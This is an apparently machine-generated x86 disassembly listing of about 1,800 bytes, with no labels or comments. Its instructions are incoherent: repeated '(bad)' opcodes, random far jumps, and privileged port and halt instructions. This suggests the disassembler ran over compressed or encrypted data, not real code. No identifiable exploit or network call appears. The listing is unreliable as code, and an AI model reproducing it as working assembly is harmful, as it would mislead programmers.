  424f4d:	adc    BYTE PTR [ebx],bl
  424f4f:	sbb    DWORD PTR [eax-0x76643d76],0xffffff8a
  424f56:	addr16 out 0x6b,eax
  424f59:	mov    es,WORD PTR [ebx+0x29]
  424f5c:	ret    0x9f8
  424f5f:	push   es
  424f60:	mov    ecx,esi
  424f62:	int    0xc6
  424f64:	ror    DWORD PTR [ecx-0x62b9b3ce],cl
  424f6a:	scas   al,BYTE PTR es:[edi]
  424f6b:	jns    0x424fbc
  424f6d:	test   al,0x39
  424f6f:	div    BYTE PTR [eax]
  424f71:	pop    ebp
  424f72:	mov    eax,ds:0x389eec2e
  424f77:	dec    eax
  424f78:	dec    ecx
  424f79:	clc    
  424f7a:	call   0x584d:0xd07a2f45
  424f81:	das    
  424f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f83:	push   es
  424f84:	adc    esi,DWORD PTR [esi+0x4e]
  424f87:	out    dx,al
  424f88:	loop   0x424f6c
  424f8a:	add    eax,0xbe7bd052
  424f8f:	scas   al,BYTE PTR es:[edi]
  424f90:	jno    0x424fc8
  424f92:	pop    ecx
  424f93:	ss jmp 0x2b9457e
  424f99:	ss clc 
  424f9b:	popf   
  424f9c:	mov    DWORD PTR [edx],edx
  424f9e:	and    eax,0x5b556b0e
  424fa3:	inc    ecx
  424fa4:	adc    eax,0x23e9937a
  424fa9:	dec    edi
  424faa:	rol    BYTE PTR [edx-0x6a9440cc],cl
  424fb0:	jb     0x424fcc
  424fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fb3:	mov    ah,0xd8
  424fb5:	push   ebx
  424fb6:	mov    bh,0x49
  424fb8:	fst    QWORD PTR [edi-0x6c912f8]
  424fbe:	jns    0x424fad
  424fc0:	dec    esi
  424fc1:	imul   ebx,DWORD PTR [edi+eiz*8+0x584809ad],0x174ba16b
  424fcc:	in     al,0x57
  424fce:	clc    
  424fcf:	sub    al,0x1
  424fd1:	jo     0x424ffb
  424fd3:	outs   dx,DWORD PTR ds:[esi]
  424fd4:	fwait
  424fd5:	mov    edi,0x7b4c35fb
  424fda:	in     eax,0xd2
  424fdc:	xchg   ebx,eax
  424fdd:	pop    edx
  424fde:	data16 jmp 0x42503c
  424fe1:	inc    edx
  424fe2:	outs   dx,DWORD PTR ds:[esi]
  424fe3:	cmp    esi,DWORD PTR [ebp-0x7166eec9]
  424fe9:	test   BYTE PTR [esi],ch
  424feb:	stos   BYTE PTR es:[edi],al
  424fec:	or     bh,BYTE PTR ds:0xaff9cd1f
  424ff2:	xor    BYTE PTR [edx],cl
  424ff4:	sub    al,0x35
  424ff6:	sbb    esi,DWORD PTR [ebx]
  424ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ff9:	mov    es:0xb9d84da,eax
  424fff:	ret    
  425000:	jbe    0x424fe1
  425002:	(bad)  
  425003:	xor    eax,0x9389386d
  425008:	hlt    
  425009:	or     al,0x42
  42500b:	push   ss
  42500c:	sub    DWORD PTR [eax],esi
  42500e:	mov    ds:0x674efd49,eax
  425013:	inc    ebp
  425014:	loop   0x424fcc
  425016:	push   ds
  425017:	pusha  
  425018:	adc    ebx,edi
  42501a:	push   0x44
  42501c:	push   edx
  42501d:	xor    eax,0x1637f93e
  425022:	add    dl,bl
  425024:	retf   0x9d02
  425027:	in     al,dx
  425028:	jmp    FWORD PTR [edx-0x7a]
  42502b:	xor    DWORD PTR [edx],0x77
  42502e:	and    dl,BYTE PTR [ebx-0x1aa13690]
  425034:	imul   ebx,DWORD PTR [edi],0x4a72250a
  42503a:	sbb    ecx,esi
  42503c:	push   edi
  42503d:	scas   eax,DWORD PTR es:[edi]
  42503e:	inc    ebp
  42503f:	add    al,0xa1
  425041:	pop    ebp
  425042:	fadd   QWORD PTR [ebx+0x2a5131b5]
  425048:	mov    al,0xc4
  42504a:	in     al,0xb
  42504c:	jg     0x42500f
  42504e:	push   edx
  42504f:	cmp    edi,DWORD PTR [ebp-0x33]
  425052:	js     0x4250d1
  425054:	xor    dl,0xe1
  425057:	fst    DWORD PTR fs:[edi]
  42505a:	test   DWORD PTR [esi+ecx*2+0x5d733d8d],esp
  425061:	fwait
  425062:	test   dh,dh
  425064:	pop    ss
  425065:	ror    BYTE PTR [edi],cl
  425067:	call   0xa2fe:0xfea80306
  42506e:	mov    eax,DWORD PTR [eax+0x15]
  425071:	inc    edx
  425072:	xchg   ecx,eax
  425073:	lods   eax,DWORD PTR ds:[esi]
  425074:	outs   dx,BYTE PTR ds:[esi]
  425075:	sub    dl,cl
  425077:	(bad)  
  425078:	and    ah,ah
  42507a:	push   ebp
  42507b:	test   BYTE PTR [esi+0x50],0x90
  42507f:	sti    
  425080:	fs sub al,0xd
  425083:	adc    al,0x69
  425085:	loopne 0x425058
  425087:	adc    DWORD PTR [esi],esi
  425089:	or     edi,ebx
  42508b:	push   ebp
  42508c:	jp     0x4250f8
  42508e:	cmp    BYTE PTR [ebp-0x3],cl
  425091:	inc    edi
  425092:	and    bh,dh
  425094:	inc    ecx
  425095:	test   DWORD PTR [ecx+0x50],0xbca1a22a
  42509c:	cld    
  42509d:	cmp    DWORD PTR [ecx],0x7
  4250a0:	lahf   
  4250a1:	inc    eax
  4250a2:	cwde   
  4250a3:	mov    al,0x70
  4250a5:	ins    BYTE PTR es:[edi],dx
  4250a6:	(bad)  
  4250a7:	cmp    al,0xb2
  4250a9:	out    0x9a,eax
  4250ab:	push   ecx
  4250ac:	clc    
  4250ad:	cli    
  4250ae:	aaa    
  4250af:	mov    dl,0xd5
  4250b1:	jge    0x4250ce
  4250b3:	mov    cl,0xc1
  4250b5:	idiv   DWORD PTR [edi-0xb]
  4250b8:	sub    BYTE PTR [edx+ebx*4],bl
  4250bb:	cwde   
  4250bc:	pusha  
  4250bd:	and    ecx,DWORD PTR [edx]
  4250bf:	dec    ebp
  4250c0:	jge    0x42511a
  4250c2:	lea    ebp,[edx+0x3d]
  4250c5:	dec    ebx
  4250c6:	pop    es
  4250c7:	(bad)  
  4250c8:	jl     0x425083
  4250ca:	pop    edi
  4250cb:	ins    BYTE PTR es:[edi],dx
  4250cc:	mov    bh,0xa4
  4250ce:	mov    ch,0x3a
  4250d0:	dec    ebx
  4250d1:	sub    ebx,DWORD PTR [ebp-0x3001b87d]
  4250d7:	ins    BYTE PTR es:[edi],dx
  4250d8:	push   ebp
  4250d9:	pop    ebx
  4250da:	xor    DWORD PTR [esi],esi
  4250dc:	xlat   BYTE PTR ds:[ebx]
  4250dd:	dec    esp
  4250de:	in     al,0x9d
  4250e0:	(bad)
  4250e3:	sub    ebp,esi
  4250e5:	std    
  4250e6:	into   
  4250e7:	leave  
  4250e8:	aaa    
  4250e9:	lods   eax,DWORD PTR ds:[esi]
  4250ea:	cdq    
  4250eb:	ins    BYTE PTR es:[edi],dx
  4250ec:	push   edi
  4250ed:	test   BYTE PTR [ecx+0x4a3edac8],bl
  4250f3:	je     0x4250c5
  4250f5:	ror    BYTE PTR ds:[esi+0x63],0xe3
  4250fa:	test   BYTE PTR [edi+edi*4],bh
  4250fd:	sti    
  4250fe:	sbb    ebp,DWORD PTR [esi-0x3e]
  425101:	push   ebx
  425102:	jle    0x425165
  425104:	xor    dl,ah
  425106:	mov    bl,0xd9
  425108:	sahf   
  425109:	mov    edx,0x7f6d8da4
  42510e:	sub    DWORD PTR [ecx-0x2a],0xab86f16d
  425115:	xor    BYTE PTR [ecx],ah
  425117:	in     eax,dx
  425118:	push   ebx
  425119:	cmp    eax,0xfd52170e
  42511e:	dec    esp
  42511f:	aas    
  425120:	(bad)  
  425122:	xor    eax,0xbdbaad8a
  425127:	adc    bh,bl
  425129:	ins    DWORD PTR es:[edi],dx
  42512a:	jl     0x4250ed
  42512c:	mov    bl,al
  42512e:	popf   
  42512f:	nop
  425130:	push   0xffffff86
  425132:	ja     0x42512d
  425134:	and    BYTE PTR [esp+esi*4+0x13c08581],ch
  42513b:	pop    eax
  42513c:	shr    DWORD PTR [ecx],0x68
  42513f:	enter  0x928a,0x2c
  425143:	pop    edx
  425144:	pushf  
  425145:	les    ecx,FWORD PTR [esi+0x11df990f]
  42514b:	ins    BYTE PTR es:[edi],dx
  42514c:	dec    esi
  42514d:	sbb    dh,BYTE PTR [ebx]
  42514f:	sbb    DWORD PTR [edx],esp
  425151:	or     DWORD PTR [edi+0x6815386e],ecx
  425157:	dec    esi
  425158:	mov    ebp,0x46ff8d88
  42515d:	sbb    DWORD PTR [ebx+0x75fa96cd],esp
  425163:	sub    ebp,esi
  425165:	sti    
  425166:	dec    BYTE PTR [ecx-0x8d1a086]
  42516c:	test   eax,0xca188c8a
  425171:	or     dl,BYTE PTR [edi-0xb]
  425174:	enter  0x43d8,0x5e
  425178:	xchg   esi,eax
  425179:	ret    
  42517a:	mov    ch,0xfa
  42517c:	stc    
  42517d:	xlat   BYTE PTR ds:[ebx]
  42517e:	push   ss
  42517f:	(bad)  
  425180:	sbb    al,0xce
  425182:	cld    
  425183:	out    0x4f,al
  425185:	push   esi
  425186:	and    edx,DWORD PTR [ecx-0x501204b2]
  42518c:	sub    dl,BYTE PTR [edi+0x67]
  42518f:	test   BYTE PTR [edx-0x479ead62],al
  425195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425196:	jg     0x425166
  425198:	jg     0x425193
  42519a:	xchg   ebp,eax
  42519b:	fiadd  DWORD PTR ds:0x9ddec56d
  4251a1:	jge    0x42520a
  4251a3:	fcmovb st,st(0)
  4251a5:	stos   WORD PTR es:[edi],ax
  4251a7:	(bad)
  4251ab:	and    BYTE PTR [ecx+0x65b571ab],ch
  4251b1:	xchg   DWORD PTR [eax-0x14],edi
  4251b4:	xchg   DWORD PTR [ebx],edx
  4251b6:	jne    0x4251cd
  4251b8:	call   0xa8897919
  4251bd:	adc    eax,0x33ea1fd1
  4251c2:	(bad)  
  4251c3:	jmp    FWORD PTR [eax]
  4251c5:	pop    edi
  4251c6:	mov    edi,0xe94e0c53
  4251cb:	xor    DWORD PTR [ecx],ecx
  4251cd:	xor    BYTE PTR [ebp+edi*1+0x4910f09b],dh
  4251d4:	jmp    0x8267:0x5e6b3eb6
  4251db:	lahf   
  4251dc:	and    DWORD PTR [edi+0x43dc2772],ebx
  4251e2:	rcr    DWORD PTR [ecx+eiz*1-0x78],1
  4251e6:	jnp    0x425209
  4251e8:	fsubr  st(1),st
  4251ea:	scas   eax,DWORD PTR es:[edi]
  4251eb:	test   BYTE PTR [edx],0x54
  4251ee:	clc    
  4251ef:	loope  0x425221
  4251f1:	inc    esi
  4251f2:	shl    BYTE PTR [ebp+0x77090bbe],0x4a
  4251f9:	enter  0xd5e6,0xdf
  4251fd:	pushf  
  4251fe:	pop    ds
  4251ff:	push   ecx
  425200:	ds inc esp
  425202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425203:	or     esi,DWORD PTR [edi-0x300ecb71]
  425209:	mov    ds:0x5df785b9,al
  42520e:	sbb    cl,bl
  425210:	mov    ebp,0x86582928
  425215:	jl     0x425238
  425217:	pop    ds
  425218:	pop    esi
  425219:	sahf   
  42521a:	push   ecx
  42521b:	dec    edx
  42521c:	neg    BYTE PTR [edx+0x4]
  42521f:	push   ecx
  425220:	imul   ebp,DWORD PTR [ebp+edx*8+0x73],0xffffff85
  425225:	dec    esi
  425226:	mov    edi,0xa9b57e2a
  42522b:	xor    ebx,DWORD PTR [ebp-0x3ba2b8c2]
  425231:	inc    esi
  425232:	xchg   ebx,eax
  425233:	jb     0x425290
  425235:	pop    ds
  425236:	push   ss
  425237:	mov    cl,0x3d
  425239:	mov    ch,0xf8
  42523b:	fst    DWORD PTR [ebx+0x75f19598]
  425241:	xor    edx,ebp
  425243:	xor    edi,DWORD PTR [ebx+0x70f98a0e]
  425249:	push   ss
  42524a:	fnstsw WORD PTR [ebp+0x64146769]
  425250:	sar    cl,1
  425252:	in     eax,0x48
  425254:	mov    esp,0xc9ea59a0
  425259:	mov    edi,0xdca3704d
  42525e:	and    BYTE PTR [ebp+0x70],dl
  425261:	fdiv   st(6),st
  425263:	push   edx
  425264:	sub    ch,BYTE PTR [edx]
  425266:	cld    
  425267:	xchg   edi,eax
  425268:	(bad)  
  425269:	inc    ecx
  42526a:	fistp  QWORD PTR [esi]
  42526c:	mov    ebp,0xdc0259eb
  425271:	je     0x425229
  425273:	lods   eax,DWORD PTR ds:[esi]
  425274:	push   0xffffff8c
  425276:	loopne 0x425231
  425278:	mov    WORD PTR [esp+ecx*8-0x40],fs
  42527c:	call   0x7ae8:0x1b2eb922
  425283:	xchg   bh,cl
  425285:	sbb    al,0xbe
  425287:	and    BYTE PTR [edi-0x6ef4adca],dl
  42528d:	pop    ebp
  42528e:	mov    esi,0x9cf22878
  425293:	das    
  425294:	sbb    ch,bl
  425296:	push   ebx
  425297:	dec    ebx
  425298:	lock adc al,0x9b
  42529b:	jmp    0xbba4:0xbca63f3a
  4252a2:	or     al,0x12
  4252a4:	xchg   edi,eax
  4252a5:	cmp    ah,dl
  4252a7:	test   al,0xc5
  4252a9:	retf   0x7b2a
  4252ac:	mov    ebx,DWORD PTR [ecx+0x11]
  4252af:	cwde   
  4252b0:	(bad)  
  4252b1:	xor    bh,cl
  4252b3:	pop    ecx
  4252b4:	pop    edx
  4252b5:	jmp    0x4252b6
  4252b7:	push   edx
  4252b8:	sub    al,0x60
  4252ba:	hlt    
  4252bb:	fsub   QWORD PTR [edi+0x563fcd93]
  4252c1:	cld    
  4252c2:	push   ebp
  4252c3:	sub    eax,0x343dacca
  4252c8:	xchg   DWORD PTR [eax+edi*8],edi
  4252cb:	pusha  
  4252cc:	popf   
  4252cd:	or     eax,0xd1d62eb4
  4252d2:	add    eax,0xe10d28a8
  4252d7:	nop
  4252d8:	cmp    ebp,ebp
  4252da:	leave  
  4252db:	cwde   
  4252dc:	pop    ecx
  4252dd:	jns    0x4252bc
  4252df:	push   ds
  4252e0:	js     0x425343
  4252e2:	div    edi
  4252e4:	mov    edx,DWORD PTR [ecx-0x5f]
  4252e7:	adc    DWORD PTR [esi+edi*1],ebx
  4252ea:	fwait
  4252eb:	cwde   
  4252ec:	fimul  WORD PTR [ebx-0x6941cdc8]
  4252f2:	mov    esp,0x3e847496
  4252f7:	mov    cl,0x98
  4252f9:	retf   
  4252fa:	scas   eax,DWORD PTR es:[edi]
  4252fb:	sub    ebx,ecx
  4252fd:	adc    eax,0x5737efe6
  425302:	cmc    
  425303:	xchg   ebx,eax
  425304:	std    
  425305:	js     0x425353
  425307:	std    
  425308:	jmp    0x6680:0xc304067f
  42530f:	mov    dl,0x3
  425311:	inc    ebx
  425312:	push   esi
  425313:	fld    DWORD PTR [ebx]
  425315:	test   edx,ebp
  425317:	sti    
  425318:	pop    ebx
  425319:	sbb    al,0xfd
  42531b:	stos   DWORD PTR es:[edi],eax
  42531c:	loopne 0x42531a
  42531e:	xor    edi,DWORD PTR [eax+0x153f8990]
  425324:	gs jmp 0x3257f9d8
  42532a:	hlt    
  42532b:	jb     0x42534d
  42532d:	mov    ds:0x72ed514,al
  425332:	fdiv   st,st(1)
  425334:	cdq    
  425335:	out    dx,eax
  425336:	xor    al,0x15
  425338:	mov    al,ds:0xd42591ee
  42533d:	dec    edx
  42533e:	repz cmp ebp,DWORD PTR [ebp+0x15a25fd1]
  425345:	inc    edx
  425346:	mov    WORD PTR [edx-0x4e],fs
  425349:	test   bh,dh
  42534b:	rcr    ebx,1
  42534d:	add    ebx,ebp
  42534f:	cmp    BYTE PTR ss:[edx+0x75],al
  425353:	adc    DWORD PTR [edx],edx
  425355:	cld    
  425356:	or     bh,bh
  425358:	mov    eax,ds:0xb8a764ce
  42535d:	lods   al,BYTE PTR ds:[esi]
  42535e:	dec    ebp
  42535f:	scas   al,BYTE PTR es:[edi]
  425360:	test   al,dh
  425362:	mov    bl,0xf9
  425364:	push   ecx
  425365:	stos   DWORD PTR es:[edi],eax
  425366:	test   DWORD PTR [edi+0x4b],ebx
  425369:	jmp    0x970f2b60
  42536e:	mov    BYTE PTR [edx+0x3bdfc107],al
  425374:	btr    DWORD PTR [edi+0x4a],esp
  425378:	leave  
  425379:	dec    edx
  42537a:	add    al,0x24
  42537c:	and    edi,DWORD PTR [esi]
  42537e:	imul   esp,DWORD PTR [edx],0x11532f0d
  425384:	pop    ss
  425385:	ss iret 
  425387:	outs   dx,BYTE PTR ds:[esi]
  425388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425389:	dec    esp
  42538a:	aam    0x78
  42538c:	add    edi,DWORD PTR [esi+eax*1]
  42538f:	bound  eax,QWORD PTR [eax]
  425391:	shl    dl,0x88
  425394:	and    al,0xf9
  425396:	push   edi
  425397:	mov    eax,0xe2317353
  42539c:	ss cmp al,al
  42539f:	out    dx,al
  4253a0:	sub    bh,BYTE PTR [ebx-0x2e]
  4253a3:	mov    ebx,cs
  4253a5:	or     al,BYTE PTR [eax]
  4253a7:	mov    WORD PTR [ebp+0x1d],ds
  4253aa:	add    al,0x1e
  4253ac:	pop    es
  4253ad:	pop    ecx
  4253ae:	loope  0x425412
  4253b0:	and    ah,BYTE PTR [ebp-0x7c]
  4253b3:	cs out dx,al
  4253b5:	dec    ebp
  4253b6:	int3   
  4253b7:	inc    esp
  4253b8:	ret    
  4253b9:	mov    ah,0x61
  4253bb:	push   cs
  4253bc:	imul   eax,DWORD PTR [edi-0x2b],0xffffffee
  4253c0:	test   DWORD PTR [ebx-0x58],esp
  4253c3:	stos   BYTE PTR es:[edi],al
  4253c4:	mov    ah,0x61
  4253c6:	pop    ss
  4253c7:	fcom   QWORD PTR [edi]
  4253c9:	cdq    
  4253ca:	jno    0x425382
  4253cc:	sub    al,0x45
  4253ce:	jo     0x42544c
  4253d0:	hlt    
  4253d1:	ss sub eax,0xe063db1c
  4253d7:	jecxz  0x42536b
  4253d9:	add    BYTE PTR [edi],ah
  4253db:	xchg   esi,eax
  4253dc:	inc    edx
  4253dd:	retf   
  4253de:	shl    BYTE PTR [eax-0x50],1
  4253e1:	retf   0x5461
  4253e4:	out    dx,eax
  4253e5:	push   ecx
  4253e6:	push   esi
  4253e7:	sub    ebx,DWORD PTR [ebx-0x323e01e7]
  4253ed:	addr16 mov dh,ch
  4253f0:	loop   0x425405
  4253f2:	popf   
  4253f3:	and    al,ch
  4253f5:	sbb    al,0x2b
  4253f7:	(bad)  
  4253f8:	leave  
  4253f9:	fdivrp st(1),st
  4253fb:	xchg   ebp,eax
  4253fc:	dec    ebx
  4253fd:	outs   dx,BYTE PTR ds:[esi]
  4253fe:	ins    DWORD PTR es:[edi],dx
  4253ff:	pop    ebp
  425400:	sbb    al,0x7a
  425402:	ret    0x16fe
  425405:	mov    esp,DWORD PTR [edx]
  425407:	xor    DWORD PTR [ebp+eax*2-0x55],edx
  42540b:	enter  0x999,0x42
  42540f:	cmp    dh,BYTE PTR [ebp+0x4]
  425412:	sub    esi,DWORD PTR [eax+0x5a]
  425415:	fadd   DWORD PTR [edi]
  425417:	data16 sbb BYTE PTR ss:[ebp+eiz*2-0x2d],0x2f
  42541e:	mov    al,ds:0x5194f95
  425423:	mov    edx,DWORD PTR [edi+esi*1-0x1b]
  425427:	iret   
  425428:	(bad)  
  425429:	iret   
  42542a:	mov    esp,0x6babeea2
  42542f:	ja     0x42540c
  425431:	loop   0x42548b
  425433:	sbb    bh,bh
  425435:	pop    esp
  425436:	mov    esp,0x3af6dc77
  42543b:	pop    es
  42543c:	inc    esp
  42543d:	adc    DWORD PTR [ecx-0x54],ebx
  425440:	mov    cl,0x4d
  425442:	lahf   
  425443:	sahf   
  425444:	push   edx
  425445:	cli    
  425446:	cmp    DWORD PTR [eax],esp
  425448:	add    BYTE PTR [esi-0x4e],cl
  42544b:	loop   0x42545f
  42544d:	scas   eax,DWORD PTR es:[edi]
  42544e:	sbb    DWORD PTR [eax-0x64],ecx
  425451:	xchg   ebp,eax
  425452:	out    dx,al
  425453:	mov    bl,0xb
  425455:	aas    
  425456:	and    BYTE PTR [edx-0x53e5d36e],dh
  42545c:	call   0x450d071c
  425461:	fistp  QWORD PTR [edi+0x1c89374d]
  425467:	sbb    ecx,ebx
  425469:	enter  0xf303,0xd0
  42546d:	loopne 0x4254a8
  42546f:	pop    ebx
  425470:	test   eax,0xebc7de9b
  425475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425476:	call   0xfdf41359
  42547b:	ins    DWORD PTR es:[edi],dx
  42547c:	mov    eax,ds:0x2e85dc1
  425481:	mov    ?,WORD PTR [eax-0x6c64ac47]
  425487:	mov    DWORD PTR ss:[ebp+0x66],eax
  42548b:	xchg   esi,eax
  42548c:	in     al,dx
  42548d:	xchg   ebx,eax
  42548e:	in     al,dx
  42548f:	inc    ebp
  425490:	and    BYTE PTR [eax+0x4211f05a],bl
  425496:	cmp    esi,ecx
  425498:	cli    
  425499:	aaa    
  42549a:	into   
  42549b:	cmp    bl,bl
  42549d:	or     BYTE PTR [ebp+0x3af7b46b],0xfc
  4254a4:	(bad)
  4254a8:	aad    0x80
  4254aa:	jg     0x42549b
  4254ac:	mov    ecx,DWORD PTR [ebp+0x424ad7de]
  4254b2:	out    0x76,eax
  4254b4:	cmp    edi,DWORD PTR [esi-0x24]
  4254b7:	xchg   edx,eax
  4254b8:	jns    0x4254fe
  4254ba:	mov    ah,0x81
  4254bc:	lds    esi,FWORD PTR [ebx-0x22]
  4254bf:	ror    BYTE PTR [esi],cl
  4254c1:	dec    eax
  4254c2:	add    BYTE PTR [ecx+0x7a],dh
  4254c5:	jle    0x425481
  4254c7:	sti    
  4254c8:	jo     0x42544e
  4254ca:	ds cld 
  4254cc:	mov    bh,0xb4
  4254ce:	dec    eax
  4254cf:	dec    ebx
  4254d0:	xlat   BYTE PTR ds:[ebx]
  4254d1:	mov    edi,0x80e53856
  4254d6:	dec    esp
  4254d7:	mov    ecx,DWORD PTR [edi]
  4254d9:	cwde   
  4254da:	loopne 0x42547f
  4254dc:	int3   
  4254dd:	inc    ebx
  4254de:	adc    DWORD PTR [ebp-0x3507a95b],ecx
  4254e4:	mov    bh,0x41
  4254e6:	out    0x62,al
  4254e8:	bound  edi,QWORD PTR [eax-0x7c8963b0]
  4254ee:	fsubr  st,st(1)
  4254f0:	js     0x425501
  4254f2:	aaa    
  4254f3:	repz es pusha 
  4254f6:	xlat   BYTE PTR ds:[ebx]
  4254f7:	and    eax,0x17d02ec5
  4254fc:	mov    gs,WORD PTR [ebx]
  4254fe:	xchg   ecx,eax
  4254ff:	mov    esp,0x11b0bd4d
  425504:	xor    dl,BYTE PTR [ecx]
  425506:	dec    edx
  425507:	shr    ecx,1
  425509:	dec    edx
  42550a:	xchg   esi,eax
  42550b:	jb     0x4254c5
  42550d:	imul   edx,DWORD PTR [ecx-0x18],0xc6bbe2f0
  425514:	pop    ebp
  425515:	jecxz  0x4254fc
  425517:	adc    ecx,edx
  425519:	jo     0x4254e1
  42551b:	dec    ebx
  42551c:	sub    DWORD PTR [eax-0x68],esp
  42551f:	lods   al,BYTE PTR ds:[esi]
  425520:	sub    eax,0x86a53242
  425525:	rcl    DWORD PTR [ebx],1
  425527:	dec    eax
  425528:	xor    BYTE PTR [ecx+ebx*4],bh
  42552b:	lds    esi,FWORD PTR [esi]
  42552d:	std    
  42552e:	mov    WORD PTR ds:0x4ab2167f,ds
  425534:	mov    edx,0xd31c6887
  425539:	xor    BYTE PTR [ebp+0x2dc76d6b],bh
  42553f:	cmc    
  425540:	bound  ebp,QWORD PTR ds:0xea496bd8
  425546:	dec    esi
  425547:	inc    eax
  425548:	cmc    
  425549:	mov    ch,ch
  42554b:	loop   0x4254d9
  42554d:	aaa    
  42554e:	lods   al,BYTE PTR ds:[esi]
  42554f:	aaa    
  425550:	add    BYTE PTR ss:[ebp-0x65eeb57f],ah
  425557:	(bad)
  42555a:	imul   ecx,DWORD PTR [ebp-0x59],0xdb5e6547
  425561:	(bad)  
  425562:	sub    DWORD PTR [ebx+ebp*4],esp
  425565:	jmp    0xc2c731c9
  42556a:	cmp    al,0xc0
  42556c:	or     eax,0x28537abf
  425571:	mov    bh,0x74
  425573:	dec    eax
  425574:	fadd   DWORD PTR [ecx-0x781aebc2]
  42557a:	pop    edi
  42557b:	push   0x1d329772
  425580:	and    BYTE PTR [ecx+edx*8-0x2b],cl
  425584:	popa   
  425585:	inc    esp
  425586:	fcmovnb st,st(2)
  425588:	call   0x3737:0x3d3b1840
  42558f:	cmp    al,0x5d
  425591:	inc    eax
  425592:	mov    bl,0x96
  425594:	mov    es,WORD PTR [ebx+0x7cd3417b]
  42559a:	cld    
  42559b:	daa    
  42559c:	shr    DWORD PTR [esi],0x2f
  42559f:	(bad)  
  4255a0:	xchg   ebp,eax
  4255a1:	push   esi
  4255a2:	mov    bh,0x32
  4255a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255a5:	ds or  al,0xb3
  4255a8:	pop    edi
  4255a9:	in     eax,0x3f
  4255ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255ac:	adc    ebx,DWORD PTR [edi-0x60c19db9]
  4255b2:	fnsave [ebx-0x64]
  4255b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255b6:	retf   
  4255b7:	repnz push 0xfffffffa
  4255ba:	scas   al,BYTE PTR es:[edi]
  4255bb:	pusha  
  4255bc:	cs mov dh,0xb3
  4255bf:	pop    ebx
  4255c0:	pop    es
  4255c1:	inc    eax
  4255c2:	fadd   st,st(5)
  4255c4:	ins    DWORD PTR es:[edi],dx
  4255c5:	sub    al,0x5f
  4255c7:	push   0x6f
  4255c9:	mov    ecx,0xf4540cf
  4255ce:	mov    dh,0xca
  4255d0:	test   eax,0x7f72e292
  4255d5:	add    eax,0x18df32d7
  4255da:	jmp    0x4e1f1ab3
  4255df:	push   edi
  4255e0:	ficom  WORD PTR [ebx-0x70]
  4255e3:	sub    al,0x31
  4255e5:	addr16 aaa 
  4255e7:	lock sbb eax,0x53d27da8
  4255ed:	mov    eax,ds:0x1b9f6b48
  4255f2:	and    ebx,ebx
  4255f4:	inc    edx
  4255f5:	inc    ebp
  4255f6:	cmp    DWORD PTR [ecx+0x69],eax
  4255f9:	call   0x998fc186
  4255fe:	adc    eax,0x697b8404
  425603:	dec    eax
  425604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425605:	aas    
  425606:	bound  eax,QWORD PTR [edx+0x36]
  425609:	sub    DWORD PTR [edi],0xc6bfb433
  42560f:	les    ecx,FWORD PTR [esi+edi*8+0x41e99b1f]
  425616:	js     0x4255fa
  425618:	retf   
  425619:	mov    ds:0xa5681d43,al
  42561e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42561f:	adc    ch,BYTE PTR [edx]
  425621:	sub    eax,0x75ee7479
  425626:	enter  0x8be5,0x54
  42562a:	pop    ecx
  42562b:	cli    
  42562c:	sahf   
  42562d:	cs aaa 
  42562f:	push   cs
  425630:	jp     0x4255f4
  425632:	stos   BYTE PTR es:[edi],al
  425633:	outs   dx,BYTE PTR ds:[esi]
  425634:	or     al,0xf9
  425636:	push   es
  425637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425638:	mov    al,al
  42563a:	push   ecx
  42563b:	add    ch,dh
  42563d:	mov    ds:0xf134ef07,eax
  425642:	inc    edx
  425643:	mov    ch,0xb9
  425645:	mov    al,0xc0
  425647:	pop    ecx
  425648:	push   0xffffffa1
  42564a:	into   
  42564b:	out    0x24,al
  42564d:	push   ds
  42564e:	mov    esi,0x7d56925
  425653:	push   ecx
  425654:	inc    ebp
  425655:	test   DWORD PTR [ebp+0x61c00d95],ebx
  42565b:	fcmove st,st(4)
  42565d:	nop
  42565e:	dec    ebx
  42565f:	sbb    al,0xd7
  425661:	in     eax,0x18
  425663:	add    al,0x12
  425665:	xchg   esp,eax
  425666:	imul   ecx,DWORD PTR [ecx-0x150f0b27],0x0
  42566d:	lds    eax,FWORD PTR es:[esi]
  425670:	mov    ah,0x33
  425672:	sbb    al,0xa1
  425674:	cli    
  425675:	ret    
  425676:	mov    ebp,0x3a64d1cc
  42567b:	(bad)  
  42567c:	in     eax,dx
  42567d:	add    dl,BYTE PTR [ecx+edi*2]
  425680:	push   esi
  425681:	ret    
  425682:	add    ch,al
  425684:	or     DWORD PTR [edx+0x4c16d3a0],esi
  42568a:	inc    esp
  42568b:	fst    QWORD PTR [edi]
  42568d:	test   BYTE PTR [esi+0x72],bl
  425690:	repnz ins DWORD PTR es:[edi],dx
  425692:	in     al,dx
  425693:	in     al,0x74
  425695:	dec    esp
  425696:	ins    BYTE PTR es:[edi],dx
  425697:	cwde   
  425698:	cmp    bh,BYTE PTR [ecx+0x7daf654d]
  42569e:	sbb    BYTE PTR [ebp+0x6a30e0da],dl
  4256a4:	inc    ecx
  4256a5:	das    
  4256a6:	or     DWORD PTR [eax],edx
  4256a8:	jmp    0x425653
  4256aa:	loopne 0x4256f1
  4256ac:	push   ss
  4256ad:	mov    ds:0xfbaa5753,al
  4256b2:	mov    eax,0x83c5bf9a
  4256b7:	push   edi
  4256b8:	sub    ebx,DWORD PTR [ebx]
  4256ba:	shr    BYTE PTR [ecx],cl
  4256bc:	je     0x42564d
  4256be:	mov    dl,BYTE PTR [edx+0x27878db2]
  4256c4:	call   0x4fff:0x7470bd5
  4256cb:	dec    eax
  4256cc:	test   DWORD PTR [edi+ecx*4-0x29403258],edi
  4256d3:	mov    esi,0x2296c622
  4256d8:	shr    bh,cl
  4256da:	xor    al,BYTE PTR [ebp+0x17]
  4256dd:	out    dx,al
  4256de:	daa    
  4256df:	ss jno 0x4256e1
  4256e2:	imul   ecx,DWORD PTR [edi+0x12],0xffffff8c
